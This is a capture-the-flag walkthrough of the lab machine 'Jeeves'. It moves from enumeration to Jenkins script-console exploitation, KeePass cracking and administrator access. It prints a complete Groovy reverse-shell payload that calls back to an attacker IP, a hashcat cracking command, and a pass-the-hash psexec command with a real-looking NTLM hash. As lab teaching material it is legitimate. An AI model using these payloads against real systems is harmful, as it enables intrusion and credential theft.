## About

Jeeves is a relatively straightforward challenge but focuses on some interesting techniques, providing a great learning experience. The use of alternate data streams is uncommon, and some users may have difficulty locating the correct escalation path.

## Initial Enumeration

Run the following `nmap` scan to enumerate open ports and services:

`nmap -A -T4 -p- 10.129.228.112`
### Nmap Output:

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
```
```
Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-03-16T22:07:11
|_  start_date: 2025-03-16T21:57:47

```
### Web Port Enumeration

I decided to start directory enumeration on both web ports (TCP:80 and TCP:50000). Upon discovering a hit on `http://10.129.228.112:50000/askjeeves/`, I navigated to the page, which revealed a Jenkins Web interface.

![Jenkins Webpage](Images/Pasted%20image%2020250316131434.png)

Upon further exploration, I found the `Administrator` directory.

![Administrator Directory](Images/Pasted%20image%2020250316131727.png)

The page also appeared to allow for script execution.

![Script Console](Images/Pasted%20image%2020250316131833.png)

A quick Google search led me to a [Groovy Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76).

## Exploitation

### Reverse Shell

Utilizing the Groovy Reverse Shell, I generated a reverse shell to the target machine.

```php
String host="10.10.14.13";
int port=9090;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

After setting up a listener and executing the script, I was able to obtain a shell.

![Reverse Shell](Images/Pasted%20image%2020250316132122.png)

I then grabbed the user flag before moving on to the next steps.

![User Flag](Images/Pasted%20image%2020250316132336.png)

## Post Exploitation

### Enumeration

#### Exploit Suggester

The following vulnerabilities were suggested by the exploit suggester tool:

```
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical

```

#### Privilege Enumeration

During enumeration, I found that the user account had "Impersonate Privilege."

![Privilege Enumeration](Images/Pasted%20image%2020250316132818.png)

#### Directory Enumeration

While exploring the user's documents folder, I discovered a KeePass database file (`CEH.kdbx`), which was locked with a passphrase.

![KeePass Database](Images/Pasted%20image%2020250316134343.png)

To exfiltrate this file, I created a workspace within Jenkins and copied the `CEH.kdbx` file to the workspace, making it accessible via the web server.

![Jenkins Workspace](Images/Pasted%20image%2020250316135636.png)

### Privilege Escalation

#### Cracking the KeePass Database

I used the [KeePass2john](https://github.com/ivanmrsulja/keepass2john) tool to extract the hash from the KeePass database file.

![Keepass2john](Images/Pasted%20image%2020250316140223.png)

I then attempted to crack the hash using `hashcat`:

`sudo hashcat -m 13400 keepass.txt /usr/share/wordlists/rockyou.txt`
![](Images/Pasted%20image%2020250316140600.png)
After successfully cracking the hash, I obtained the passphrase `moonshine1`.


Within the Keepass Database there were numerous username:password combinations
![](Images/Pasted%20image%2020250316140636.png)
Utilizing the passwords I will generate a password list to attempt authentication.
![](Images/Pasted%20image%2020250316140829.png)
![](Images/Pasted%20image%2020250316140948.png)
None of the passwords I was able to extract were able to generate a successful authentication.

One of the files appears to be a hash rather than a password so maybe I will attempt passing that to the host.
![](Images/Pasted%20image%2020250316141115.png)
That gives us a successful authentication so now we can try and establish a shell using psexec.
`psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.228.112 cmd.exe`
![](Images/Pasted%20image%2020250316141234.png)
Grab the administrator flag.

![](Images/Pasted%20image%2020250316141820.png)

## Conclusion

This walkthrough demonstrated several key exploitation techniques, including directory enumeration, exploiting Jenkins, and cracking a KeePass database to escalate privileges and finally gain access to the Administrator account.